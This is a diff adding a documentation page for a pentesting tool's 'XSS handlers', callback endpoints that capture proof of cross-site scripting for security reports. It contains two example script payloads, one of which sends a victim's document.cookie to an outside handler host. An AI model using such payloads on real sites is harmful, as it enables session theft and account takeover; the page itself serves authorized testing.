@@ -1,0 +1,95 @@
+---
+title: "XSS handlers"
+description: "Capture and analyze cross-site scripting payload executions"
+---
+
+## Overview
+
+XSS Handlers provide callback endpoints for capturing XSS payload executions, helping you validate and demonstrate XSS vulnerabilities.
+
+## What It Does
+
+<CardGroup cols={2}>
+  <Card title="Callback Capture" icon="bullseye">
+    Receive XSS execution callbacks
+  </Card>
+  <Card title="Data Collection" icon="database">
+    Capture cookies and data
+  </Card>
+  <Card title="Proof Generation" icon="certificate">
+    Generate exploitation evidence
+  </Card>
+  <Card title="Real-time Alerts" icon="bell">
+    Instant notification of hits
+  </Card>
+</CardGroup>
+
+## How to Use
+
+<Steps>
+  <Step title="Create Handler">
+    Generate a unique handler endpoint.
+  </Step>
+  <Step title="Craft Payload">
+    Build an XSS payload using the handler URL.
+  </Step>
+  <Step title="Inject Payload">
+    Test the payload in the target application.
+  </Step>
+  <Step title="Monitor Results">
+    View callbacks when payloads execute.
+  </Step>
+</Steps>
+
+## Handler Types
+
+| Type | Purpose | Data Captured |
+|------|---------|---------------|
+| Basic | Simple execution proof | Timestamp, source |
+| Cookie | Cookie exfiltration | Cookies, headers |
+| DOM | DOM data capture | Page content, localStorage |
+| Screenshot | Visual capture | Page screenshot |
+
+## Example Payloads
+
+### Basic Callback
+
+```javascript
+<script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID"</script>
+```
+
+### Cookie Capture
+
+```javascript
+<script>new Image().src="https://handler.pentest-tools.com/h/YOUR_ID?c="+document.cookie</script>
+```
+
+## Captured Data
+
+For each callback:
+- Timestamp
+- Source IP
+- Cookies (if captured)
+- Referer header
+- User agent
+- Custom parameters
+
+<Warning>
+XSS handlers capture real data. Handle captured cookies and session data responsibly and delete after testing.
+</Warning>
+
+## Use Cases
+
+- Validate reflected XSS
+- Prove stored XSS impact
+- Demonstrate session hijacking risk
+- Document for reports
+
+<Tip>
+Use XSS handlers to provide undeniable proof of exploitation in your security reports.
+</Tip>
+
+## Related Tools
+
+- [XSS Scanner](/tools/xss-scanner)
+- [Website Vulnerability Scanner](/tools/website-vulnerability-scanner)
